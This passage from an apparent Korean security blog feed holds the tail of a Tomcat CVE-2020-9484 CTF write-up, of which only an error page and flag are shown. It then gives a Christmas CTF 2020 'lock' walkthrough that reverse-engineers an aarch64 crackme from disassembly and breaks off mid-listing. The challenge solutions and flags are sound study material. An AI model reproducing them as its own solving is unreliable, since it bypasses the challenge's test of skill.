class="hljs-number">12px</span>;} <span class="hljs-selector-tag">a</span> {<span class="hljs-attribute">color</span>:black;} <span class="hljs-selector-class">.line</span> {<span class="hljs-attribute">height</span>:<span class="hljs-number">1px</span>;<span class="hljs-attribute">background-color</span>:<span class="hljs-number">#525D76</span>;<span class="hljs-attribute">border</span>:none;}</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>HTTP Status 500 &#x2013; Internal Server Error<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image19.png" alt></p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image20.png" alt></p><p>XMAS{0mg_u_f1nd_a_sp3cia1_g1ft!!}</p>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>rce</tag>
      
      <tag>ctf</tag>
      
      <tag>idioth</tag>
      
      <tag>tomcat</tag>
      
      <tag>christmas ctf 2020</tag>
      
      <tag>web</tag>
      
      <tag>lfi</tag>
      
      <tag>cve-2020-9484</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] Christmas CTF 2020 - lock</title>
    <link href="/2020/12/29/idioth/christmasctf2020-lock/"/>
    <url>/2020/12/29/idioth/christmasctf2020-lock/</url>
    
    <content type="html"><![CDATA[<h1 id="&#xCD9C;&#xC81C;-&#xC758;&#xB3C4;"><a href="#&#xCD9C;&#xC81C;-&#xC758;&#xB3C4;" class="headerlink" title="&#xCD9C;&#xC81C; &#xC758;&#xB3C4;"></a>&#xCD9C;&#xC81C; &#xC758;&#xB3C4;</h1><p>baby_crackme&#xB97C; &#xD558;&#xB098; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xB0B4;&#xACE0; &#xC2F6;&#xC5C8;&#xB294;&#xB370; arm&#xC73C;&#xB85C; &#xB0B4;&#xBA74; &#xC5B4;&#xB5A8;&#xAE4C;? &#xC2F6;&#xC5B4;&#xC11C; &#xB0B8; &#xBB38;&#xC81C;&#xC785;&#xB2C8;&#xB2E4;.</p><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>dump&#xB85C; &#xD30C;&#xC77C;&#xC774; &#xD558;&#xB098; &#xC8FC;&#xC5B4;&#xC9C0;&#xBA70; vscode&#xB098; &#xBA54;&#xBAA8;&#xC7A5; &#xB4F1;&#xC73C;&#xB85C; &#xC5F4;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; dump &#xCF54;&#xB4DC;&#xAC00; &#xB098;&#xC635;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/12/29/idioth/christmasctf2020-lock/image0.png" alt></p><p>aarch64&#xC5D0;&#xC11C; &#xB3D9;&#xC791;&#xD558;&#xB294; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC774;&#xBA70; Input &#xAC12;&#xC744; &#xD1B5;&#xD574; &#xC5B4;&#xB5A0;&#xD55C; &#xC5F0;&#xC0B0;&#xC744; &#xC218;&#xD589;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs llvm"><span class="hljs-number">0000000000000</span><span class="hljs-keyword">c</span><span class="hljs-number">50</span> &lt;main&gt;: <span class="hljs-keyword">c</span><span class="hljs-number">50</span>:   a<span class="hljs-number">9</span>be<span class="hljs-number">7</span>bfd    stp <span class="hljs-keyword">x</span><span class="hljs-number">29</span>, <span class="hljs-keyword">x</span><span class="hljs-number">30</span>, [sp, #<span class="hljs-number">-32</span>]! <span class="hljs-keyword">c</span><span class="hljs-number">54</span>:   <span class="hljs-number">910003</span>fd    mov <span class="hljs-keyword">x</span><span class="hljs-number">29</span>, sp <span class="hljs-keyword">c</span><span class="hljs-number">58</span>:   d<span class="hljs-number">2800021</span>    mov <span class="hljs-keyword">x</span><span class="hljs-number">1</span>, <span class="hljs-symbol">#0</span><span class="hljs-keyword">x</span><span class="hljs-number">1</span> &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0;  // <span class="hljs-symbol">#1</span> <span class="hljs-keyword">c</span><span class="hljs-number">5</span><span class="hljs-keyword">c</span>:   d<span class="hljs-number">2800260</span>    mov <span class="hljs-keyword">x</span><span class="hljs-number">0</span>, <span class="hljs-symbol">#0</span><span class="hljs-keyword">x</span><span class="hljs-number">13</span> &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0;   // <span class="hljs-symbol">#19</span> <span class="hljs-keyword">c</span><span class="hljs-number">60</span>:   <span class="hljs-number">97</span>fffee<span class="hljs-number">0</span>    bl  <span class="hljs-number">7e0</span> &lt;calloc<span class="hljs-title">@plt</span>&gt; <span class="hljs-keyword">c</span><span class="hljs-number">64</span>:   f<span class="hljs-number">9000</span>be<span class="hljs-number">0</span>    str <span class="hljs-keyword">x</span><span class="hljs-number">0</span>, [sp, <span class="hljs-symbol">#16</span>] <span class="hljs-keyword">c</span><span class="hljs-number">68</span>:   <span class="hljs-number">97</span>ffff<span class="hljs-number">94</span>    bl  ab<span class="hljs-number">8</span> &lt;sub_ab<span class="hljs-number">8</span>&gt; <span class="hljs-keyword">c</span><span class="hljs-number">6</span><span class="hljs-keyword">c</span>:   <span class="hljs-number">97</span>ffff<span class="hljs-number">51</span>    bl  <span class="hljs-number">9</span>b<span class="hljs-number">0</span> &lt;sub_<span class="hljs-number">9</span>b<span class="hljs-number">0</span>&gt; <span class="hljs-keyword">c</span><span class="hljs-number">70</span>:   f<span class="hljs-number">9000</span>fe<span class="hljs-number">0</span>    str <span class="hljs-keyword">x</span><span class="hljs-number">0</span>, [sp, <span class="hljs-symbol">#24</span>] <span class="hljs-keyword">c</span><span class="hljs-number">74</span>:   <span class="hljs-number">97</span>ffff<span class="hljs-number">3</span>e    bl  <span class="hljs-number">96</span><span class="hljs-keyword">c</span> &lt;sub_<span class="hljs-number">96</span><span class="hljs-keyword">c</span>&gt; <span class="hljs-keyword">c</span><span class="hljs-number">78</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">1</span>    ldr <span class="hljs-keyword">x</span><span class="hljs-number">1</span>, [sp, <span class="hljs-symbol">#16</span>] <span class="hljs-keyword">c</span><span class="hljs-number">7</span><span class="hljs-keyword">c</span>:   <span class="hljs-number">90000000</span>    adrp    <span class="hljs-keyword">x</span><span class="hljs-number">0</span>, <span class="hljs-number">0</span> &lt;_init<span class="hljs-number">-0</span><span class="hljs-keyword">x</span><span class="hljs-number">760</span>&gt; <span class="hljs-keyword">c</span><span class="hljs-number">80</span>:   <span class="hljs-number">9138</span>a<span class="hljs-number">000</span>    <span class="hljs-keyword">add</span> <span class="hljs-keyword">x</span><span class="hljs-number">0</span>, <span class="hljs-keyword">x</span><span class="hljs-number">0</span>, <span class="hljs-symbol">#0</span>xe<span class="hljs-number">28</span> &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0;  // <span class="hljs-symbol">#0</span>xe<span class="hljs-number">28</span> &apos;<span class="hljs-symbol">%s</span>&apos; <span class="hljs-keyword">c</span><span class="hljs-number">84</span>:   <span class="hljs-number">97</span>fffeeb    bl  <span class="hljs-number">830</span> &lt;__isoc<span class="hljs-number">99</span>_scanf<span class="hljs-title">@plt</span>&gt; <span class="hljs-keyword">c</span><span class="hljs-number">88</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">1</span>    ldr <span class="hljs-keyword">x</span><span class="hljs-number">1</span>, [sp, <span class="hljs-symbol">#24</span>] <span class="hljs-keyword">c</span><span class="hljs-number">8</span><span class="hljs-keyword">c</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr <span class="hljs-keyword">x</span><span class="hljs-number">0</span>, [sp, <span class="hljs-symbol">#16</span>] <span class="hljs-keyword">c</span><span class="hljs-number">90</span>:   <span class="hljs-number">97</span>ffffa<span class="hljs-number">8</span>    bl  b<span class="hljs-number">30</span> &lt;sub_b<span class="hljs-number">30</span>&gt; <span class="hljs-keyword">c</span><span class="hljs-number">94</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr <span class="hljs-keyword">x</span><span class="hljs-number">0</span>, [sp, <span class="hljs-symbol">#16</span>] <span class="hljs-keyword">c</span><span class="hljs-number">98</span>:   <span class="hljs-number">97</span>fffee<span class="hljs-number">2</span>    bl  <span class="hljs-number">820</span> &lt;<span class="hljs-keyword">free</span><span class="hljs-title">@plt</span>&gt; <span class="hljs-keyword">c</span><span class="hljs-number">9</span><span class="hljs-keyword">c</span>:   <span class="hljs-number">52800000</span>    mov w<span class="hljs-number">0</span>, <span class="hljs-symbol">#0</span><span class="hljs-keyword">x</span><span class="hljs-number">0</span> &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0;  // <span class="hljs-symbol">#0</span> ca<span class="hljs-number">0</span>:   a<span class="hljs-number">8</span><span class="hljs-keyword">c</span><span class="hljs-number">27</span>bfd    ldp <span class="hljs-keyword">x</span><span class="hljs-number">29</span>, <span class="hljs-keyword">x</span><span class="hljs-number">30</span>, [sp], <span class="hljs-symbol">#32</span> ca<span class="hljs-number">4</span>:   d<span class="hljs-number">65</span>f<span class="hljs-number">03</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>    <span class="hljs-keyword">ret</span></code></pre><p>main &#xD568;&#xC218;&#xB97C; &#xBCF4;&#xBA74; <code>sp + #16</code>&#xC5D0; calloc(0x13,1)&#xC744; &#xD574;&#xC8FC;&#xACE0; <code>sub_ab8</code>&#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB41C; &#xD6C4; &#xB098;&#xC628; &#xAC12;&#xC744; &#xC778;&#xC790;&#xB85C; <code>sub_9b0</code> &#xD568;&#xC218;&#xAC00; &#xC2E4;&#xD589;&#xB41C; &#xD6C4; <code>sp + #24</code>&#xC5D0; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8; &#xD6C4; <code>sub_96c</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xACE0; &#xAC12;&#xC744; &#xBC1B;&#xC544;&#xC11C;<code>sp+#16</code>&#xC5D0; &#xB123;&#xC5B4;&#xC8FC;&#xACE0;  <code>sub_9b0(sub_ab8())</code> &#xD55C; &#xAC12;&#xACFC; input &#xAC12;&#xC744; &#xC778;&#xC790;&#xB85C; <code>sub_b30</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xACE0; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xC885;&#xB8CC;&#xB429;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xD568;&#xC218;&#xB97C; c &#xCF54;&#xB4DC;&#xB85C; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xB098;&#xD0C0;&#xB0B4;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-comment">// main</span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>{ &#xA0; &#xA0;<span class="hljs-keyword">char</span> *var1 = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">0x13</span>, <span class="hljs-number">1</span>); &#xA0; &#xA0;<span class="hljs-keyword">int</span> var2 = sub_9b0(sub_ab8()); &#xA0; &#xA0;sub_96c(); &#xA0; &#xA0;<span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, var1); &#xA0; &#xA0;sub_b30(var1, var2); &#xA0; &#xA0;<span class="hljs-built_in">free</span>(var1); &#xA0; &#xA0;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p><code>sub_ab8</code>&#xACFC; <code>sub_9b0</code> &#xD568;&#xC218;&#xB97C; &#xC0B4;&#xD3B4;&#xBD05;&#xC2DC;&#xB2E4;.</p><pre><code class="hljs apache"><span class="hljs-attribute">value0</span>  DCB <span class="hljs-number">0</span>x<span class="hljs-number">96</span>, <span class="hljs-number">0</span>x<span class="hljs-number">19</span>, <span class="hljs-number">0</span>x<span class="hljs-number">7</span>, <span class="hljs-number">0</span>x<span class="hljs-number">11</span>, <span class="hljs-number">0</span>x<span class="hljs-number">99</span>, <span class="hljs-number">0</span>x<span class="hljs-number">19</span>, <span class="hljs-number">0</span>x<span class="hljs-number">2</span>, <span class="hljs-number">0</span>x<span class="hljs-number">11</span><span class="hljs-attribute">value1</span>  DCB <span class="hljs-number">0</span>xF<span class="hljs-number">7</span>, <span class="hljs-number">0</span>x<span class="hljs-number">7</span>B, <span class="hljs-number">0</span>x<span class="hljs-number">64</span>, <span class="hljs-number">0</span>x<span class="hljs-number">75</span>, <span class="hljs-number">0</span>xFC, <span class="hljs-number">0</span>x<span class="hljs-number">7</span>F, <span class="hljs-number">0</span>x<span class="hljs-number">65</span>, <span class="hljs-number">0</span>x<span class="hljs-number">79</span>, <span class="hljs-number">0</span>xFF,<span class="hljs-attribute">0x73</span>, <span class="hljs-number">0</span>x<span class="hljs-number">6</span>C, <span class="hljs-number">0</span>x<span class="hljs-number">7</span>D, <span class="hljs-number">0</span>xF<span class="hljs-number">4</span>, <span class="hljs-number">0</span>x<span class="hljs-number">77</span>, <span class="hljs-number">0</span>x<span class="hljs-number">6</span>D, <span class="hljs-number">0</span>x<span class="hljs-number">61</span>, <span class="hljs-number">0</span>xE<span class="hljs-number">7</span>, <span class="hljs-number">0</span>x<span class="hljs-number">6</span>B, <span class="hljs-number">0</span>x<span class="hljs-number">74</span>, <span class="hljs-number">0</span>x<span class="hljs-number">65</span>,<span class="hljs-attribute">0xEC</span>, <span class="hljs-number">0</span>x<span class="hljs-number">6</span>F, <span class="hljs-number">0</span>x<span class="hljs-number">75</span>, <span class="hljs-number">0</span>x<span class="hljs-number">69</span>, <span class="hljs-number">0</span>xEF, <span class="hljs-number">0</span>x<span class="hljs-number">63</span>, <span class="hljs-number">0</span>x<span class="hljs-number">46</span>, <span class="hljs-number">0</span>x<span class="hljs-number">53</span>, <span class="hljs-number">0</span>xDA, <span class="hljs-number">0</span>x<span class="hljs-number">5</span>D, <span class="hljs-number">0</span>x<span class="hljs-number">47</span>,<span class="hljs-attribute">0x57</span>, <span class="hljs-number">0</span>xD<span class="hljs-number">1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">51</span>, <span class="hljs-number">0</span>x<span class="hljs-number">4</span>E, <span class="hljs-number">0</span>x<span class="hljs-number">5</span>B, <span class="hljs-number">0</span>xD<span class="hljs-number">2</span>, <span class="hljs-number">0</span>x<span class="hljs-number">55</span>, <span class="hljs-number">0</span>x<span class="hljs-number">4</span>F, <span class="hljs-number">0</span>x<span class="hljs-number">5</span>F, <span class="hljs-number">0</span>xD<span class="hljs-number">9</span>, <span class="hljs-number">0</span>x<span class="hljs-number">49</span>, <span class="hljs-number">0</span>x<span class="hljs-number">56</span>,<span class="hljs-attribute">0x43</span>, <span class="hljs-number">0</span>xCA, <span class="hljs-number">0</span>x<span class="hljs-number">4</span>D, <span class="hljs-number">0</span>x<span class="hljs-number">57</span>, <span class="hljs-number">0</span>x<span class="hljs-number">47</span>, <span class="hljs-number">0</span>xC<span class="hljs-number">1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">41</span>, <span class="hljs-number">0</span>x<span class="hljs-number">5</span>E, <span class="hljs-number">0</span>x<span class="hljs-number">4</span>B, <span class="hljs-number">0</span>xA<span class="hljs-number">9</span>, <span class="hljs-number">0</span>x<span class="hljs-number">28</span>, <span class="hljs-number">0</span>x<span class="hljs-number">30</span>,<span class="hljs-attribute">0x22</span>, <span class="hljs-number">0</span>xA<span class="hljs-number">2</span>, <span class="hljs-number">0</span>x<span class="hljs-number">2</span>C, <span class="hljs-number">0</span>x<span class="hljs-number">31</span>, <span class="hljs-number">0</span>x<span class="hljs-number">26</span>, <span class="hljs-number">0</span>xA<span class="hljs-number">1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">20</span><span class="hljs-attribute">0000000000000ab8</span> &lt;sub_ab<span class="hljs-number">8</span>&gt;: <span class="hljs-attribute">ab8</span>:   a<span class="hljs-number">9</span>be<span class="hljs-number">7</span>bfd    stp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp, #-32]!</span><span class="hljs-meta"> abc:   910003fd    mov x29, sp</span><span class="hljs-meta"> ac0:   52800103    mov w3, #0x8 &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0;  // #8</span><span class="hljs-meta"> ac4:   90000000    adrp    x0, value0@page</span><span class="hljs-meta"> ac8:   9136e002    add x2, x0, value0@pageoff</span><span class="hljs-meta"> acc:   528007c1    mov w1, #0x3e &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0;   // #62</span><span class="hljs-meta"> ad0:   90000000    adrp    x0, value1@page</span><span class="hljs-meta"> ad4:   91372000    add x0, x0, value1@pageoff</span><span class="hljs-meta"> ad8:   97ffffc9    bl  9fc &lt;sub_9fc&gt;</span><span class="hljs-meta"> adc:   f9000fe0    str x0, [sp, #24]</span> <span class="hljs-attribute">ae0</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">ae4</span>:   a<span class="hljs-number">8</span>c<span class="hljs-number">27</span>bfd    ldp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp], #32</span><span class="hljs-meta"> ae8:   d65f03c0    ret</span></code></pre><p>aarch64&#xC758; calling convention&#xC740; <code>x0</code>, <code>x1</code>, <code>x2</code>, <code>x3</code> &#xC774;&#xBBC0;&#xB85C; &#xC778;&#xC790;&#xC5D0; value1, 0x3e, value0, 0x8&#xC744; &#xB123;&#xC5B4; <code>sub_9fc</code>&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;. &#xD638;&#xCD9C;&#xD558;&#xACE0; &#xB09C; &#xD6C4; &#xC5F0;&#xC0B0;&#xB41C; &#xBB38;&#xC790;&#xC5F4;&#xC744; return &#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs apache"><span class="hljs-attribute">00000000000009b0</span> &lt;sub_<span class="hljs-number">9</span>b<span class="hljs-number">0</span>&gt;: <span class="hljs-attribute">9b0</span>:   a<span class="hljs-number">9</span>bd<span class="hljs-number">7</span>bfd    stp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp, #-48]!</span><span class="hljs-meta"> 9b4:   910003fd    mov x29, sp</span><span class="hljs-meta"> 9b8:   f9000fe0    str x0, [sp, #24]</span> <span class="hljs-attribute">9bc</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">9c0</span>:   <span class="hljs-number">97</span>ffff<span class="hljs-number">78</span>    bl  <span class="hljs-number">7</span>a<span class="hljs-number">0</span> &lt;strlen@plt&gt; <span class="hljs-attribute">9c4</span>:   <span class="hljs-number">91000400</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">1</span> <span class="hljs-attribute">9c8</span>:   <span class="hljs-number">97</span>ffff<span class="hljs-number">7</span>e    bl  <span class="hljs-number">7</span>c<span class="hljs-number">0</span> &lt;malloc@plt&gt; <span class="hljs-attribute">9cc</span>:   f<span class="hljs-number">90017</span>e<span class="hljs-number">0</span>    str x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #40]</span> <span class="hljs-attribute">9d0</span>:   f<span class="hljs-number">94017</span>e<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #40]</span> <span class="hljs-attribute">9d4</span>:   f<span class="hljs-number">100001</span>f    cmp x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">0</span> <span class="hljs-attribute">9d8</span>:   <span class="hljs-number">54000061</span>    b.ne    <span class="hljs-number">9</span>e<span class="hljs-number">4</span> &lt;sub_<span class="hljs-number">9</span>b<span class="hljs-number">0</span>+<span class="hljs-number">0</span>x<span class="hljs-number">34</span>&gt;  // b.any <span class="hljs-attribute">9dc</span>:   d<span class="hljs-number">2800000</span>    mov x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">0</span> &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0;  // #<span class="hljs-number">0</span> <span class="hljs-attribute">9e0</span>:   <span class="hljs-number">14000005</span>    b   <span class="hljs-number">9</span>f<span class="hljs-number">4</span> &lt;sub_<span class="hljs-number">9</span>b<span class="hljs-number">0</span>+<span class="hljs-number">0</span>x<span class="hljs-number">44</span>&gt; <span class="hljs-attribute">9e4</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">1</span>    ldr x<span class="hljs-number">1</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">9e8</span>:   f<span class="hljs-number">94017</span>e<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #40]</span> <span class="hljs-attribute">9ec</span>:   <span class="hljs-number">97</span>ffff<span class="hljs-number">95</span>    bl  <span class="hljs-number">840</span> &lt;strcpy@plt&gt; <span class="hljs-attribute">9f0</span>:   f<span class="hljs-number">94017</span>e<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #40]</span> <span class="hljs-attribute">9f4</span>:   a<span class="hljs-number">8</span>c<span class="hljs-number">37</span>bfd    ldp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp], #48</span><span class="hljs-meta"> 9f8:   d65f03c0    ret</span></code></pre><p><code>sub_ab8</code>&#xC5D0;&#xC11C; &#xBC18;&#xD658;&#xD55C; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xBC1B;&#xC544;&#xC11C; &#xAE38;&#xC774;&#xB97C; &#xACC4;&#xC0B0;&#xD55C; &#xD6C4; <code>malloc</code> &#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xD560;&#xB2F9;&#xD55C; &#xC8FC;&#xC18C;&#xAC00; 0&#xC774;&#xB77C;&#xBA74; 0&#xC744; &#xBC18;&#xD658;&#xD574;&#xC8FC;&#xACE0;, &#xC544;&#xB2C8;&#xBA74; <code>strcpy</code>&#xB97C; &#xD1B5;&#xD574; <code>sub_ab8</code>&#xC5D0;&#xC11C; &#xC628; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xBCF5;&#xC0AC;&#xD558;&#xC5EC; return &#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xC81C; <code>sub_9fc</code> &#xD568;&#xC218;&#xB97C; &#xBD84;&#xC11D;&#xC744; &#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><pre><code class="hljs apache"><span class="hljs-attribute">00000000000009fc</span> &lt;sub_<span class="hljs-number">9</span>fc&gt;: <span class="hljs-attribute">9fc</span>:   a<span class="hljs-number">9</span>bc<span class="hljs-number">7</span>bfd    stp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp, #-64]!</span><span class="hljs-meta"> a00:   910003fd    mov x29, sp</span><span class="hljs-meta"> a04:   f90017e0    str x0, [sp, #40]</span> <span class="hljs-attribute">a08</span>:   b<span class="hljs-number">90027</span>e<span class="hljs-number">1</span>    str w<span class="hljs-number">1</span>,<span class="hljs-meta"> [sp, #36]</span> <span class="hljs-attribute">a0c</span>:   f<span class="hljs-number">9000</span>fe<span class="hljs-number">2</span>    str x<span class="hljs-number">2</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">a10</span>:   b<span class="hljs-number">90023</span>e<span class="hljs-number">3</span>    str w<span class="hljs-number">3</span>,<span class="hljs-meta"> [sp, #32]</span> <span class="hljs-attribute">a14</span>:   b<span class="hljs-number">94027</span>e<span class="hljs-number">0</span>    ldr w<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #36]</span> <span class="hljs-attribute">a18</span>:   <span class="hljs-number">11000400</span>    add w<span class="hljs-number">0</span>, w<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">1</span> <span class="hljs-attribute">a1c</span>:   <span class="hljs-number">93407</span>c<span class="hljs-number">00</span>    sxtw    x<span class="hljs-number">0</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">a20</span>:   <span class="hljs-number">97</span>ffff<span class="hljs-number">68</span>    bl  <span class="hljs-number">7</span>c<span class="hljs-number">0</span> &lt;malloc@plt&gt; <span class="hljs-attribute">a24</span>:   f<span class="hljs-number">9001</span>fe<span class="hljs-number">0</span>    str x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #56]</span> <span class="hljs-attribute">a28</span>:   b<span class="hljs-number">98027</span>e<span class="hljs-number">0</span>    ldrsw   x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #36]</span> <span class="hljs-attribute">a2c</span>:   f<span class="hljs-number">9401</span>fe<span class="hljs-number">1</span>    ldr x<span class="hljs-number">1</span>,<span class="hljs-meta"> [sp, #56]</span> <span class="hljs-attribute">a30</span>:   <span class="hljs-number">8</span>b<span class="hljs-number">000020</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">1</span>, x<span class="hljs-number">0</span> <span class="hljs-attribute">a34</span>:   <span class="hljs-number">3900001</span>f    strb    wzr,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">a38</span>:   b<span class="hljs-number">90037</span>ff    str wzr,<span class="hljs-meta"> [sp, #52]</span> <span class="hljs-attribute">a3c</span>:   <span class="hljs-number">14000018</span>    b   a<span class="hljs-number">9</span>c &lt;sub_<span class="hljs-number">9</span>fc+<span class="hljs-number">0</span>xa<span class="hljs-number">0</span>&gt; <span class="hljs-attribute">a40</span>:   b<span class="hljs-number">98037</span>e<span class="hljs-number">0</span>    ldrsw   x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #52]</span> <span class="hljs-attribute">a44</span>:   f<span class="hljs-number">94017</span>e<span class="hljs-number">1</span>    ldr x<span class="hljs-number">1</span>,<span class="hljs-meta"> [sp, #40]</span> <span class="hljs-attribute">a48</span>:   <span class="hljs-number">8</span>b<span class="hljs-number">000020</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">1</span>, x<span class="hljs-number">0</span> <span class="hljs-attribute">a4c</span>:   <span class="hljs-number">39400002</span>    ldrb    w<span class="hljs-number">2</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">a50</span>:   b<span class="hljs-number">94037</span>e<span class="hljs-number">0</span>    ldr w<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #52]</span> <span class="hljs-attribute">a54</span>:   b<span class="hljs-number">94023</span>e<span class="hljs-number">1</span>    ldr w<span class="hljs-number">1</span>,<span class="hljs-meta"> [sp, #32]</span> <span class="hljs-attribute">a58</span>:   <span class="hljs-number">1</span>ac<span class="hljs-number">10</span>c<span class="hljs-number">03</span>    sdiv    w<span class="hljs-number">3</span>, w<span class="hljs-number">0</span>, w<span class="hljs-number">1</span> <span class="hljs-attribute">a5c</span>:   b<span class="hljs-number">94023</span>e<span class="hljs-number">1</span>    ldr w<span class="hljs-number">1</span>,<span class="hljs-meta"> [sp, #32]</span> <span class="hljs-attribute">a60</span>:   <span class="hljs-number">1</span>b<span class="hljs-number">017</span>c<span class="hljs-number">61</span>    mul w<span class="hljs-number">1</span>, w<span class="hljs-number">3</span>, w<span class="hljs-number">1</span> <span class="hljs-attribute">a64</span>:   <span class="hljs-number">4</span>b<span class="hljs-number">010000</span>    sub w<span class="hljs-number">0</span>, w<span class="hljs-number">0</span>, w<span class="hljs-number">1</span> <span class="hljs-attribute">a68</span>:   <span class="hljs-number">93407</span>c<span class="hljs-number">00</span>    sxtw    x<span class="hljs-number">0</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">a6c</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">1</span>    ldr x<span class="hljs-number">1</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">a70</span>:   <span class="hljs-number">8</span>b<span class="hljs-number">000020</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">1</span>, x<span class="hljs-number">0</span> <span class="hljs-attribute">a74</span>:   <span class="hljs-number">39400001</span>    ldrb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">a78</span>:   b<span class="hljs-number">98037</span>e<span class="hljs-number">0</span>    ldrsw   x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #52]</span> <span class="hljs-attribute">a7c</span>:   f<span class="hljs-number">9401</span>fe<span class="hljs-number">3</span>    ldr x<span class="hljs-number">3</span>,<span class="hljs-meta"> [sp, #56]</span> <span class="hljs-attribute">a80</span>:   <span class="hljs-number">8</span>b<span 